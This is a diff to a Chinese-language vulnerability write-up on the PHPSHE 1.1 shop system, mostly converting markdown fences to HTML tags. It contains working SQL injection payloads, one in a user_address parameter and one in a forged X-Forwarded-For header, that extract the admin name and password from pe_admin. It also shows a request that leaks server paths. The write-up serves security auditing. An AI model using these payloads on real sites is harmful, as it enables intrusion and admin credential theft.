@@ -106,6 +106,7 @@ info%5Buser_address`%3D(select concat(0x7e,admin_name,0x7e,admin_pw,0x7e) from p
 
 
 **product.php**
+<p>
 第一個操作**商品諮詢**就可能存在一個小BUG。
 
 ```php
@@ -126,18 +127,18 @@ case 'askadd':
 ## **【Bug 0x10: 訊息洩漏 Warning】**
 POST:
 <p>
-```/index.php?mod=product&act=askadd&id=1```
+<pre>/index.php?mod=product&act=askadd&id=1</pre>
 <br>
 DATA:
 <p>
-```ask_text[]=asfasdfasfs&pesubmit=true```
+<pre>ask_text[]=asfasdfasfs&pesubmit=true</pre>
 <br>
 
 錯誤訊息
-```
+<pre>
 Warning: nl2br() expects parameter 1 to be string, array given in E:\SourceCodes\phpshe1.1\include\function\global.func.php
 Warning: htmlspecialchars() expects parameter 1 to be string, array given in E:\SourceCodes\phpshe1.1\module\index\product.php
-```
+</pre>
 
 然後還有一個亮點`$info['user_ip'] = pe_ip();`，我們跟進`pe_ip()`函數
 
@@ -163,11 +164,11 @@ POST:
 <p>
 x-forwarded-for:
 <pre>
-```1', `ask_replytext` = (select concat(0x7e,admin_name,0x7e,admin_pw,0x7e)  from pe_admin limit 1)#
+1', `ask_replytext` = (select concat(0x7e,admin_name,0x7e,admin_pw,0x7e)  from pe_admin limit 1)#
 </pre>
 返回的訊息在商品、賣家回覆裡。
 <br >
-再往下看，在`商品列表`操作中、又是一個大大的BUG出現了。
+再往下看，在 **商品列表** 操作中、又是一個大大的BUG出現了。
 
 ```php
 //Line:83
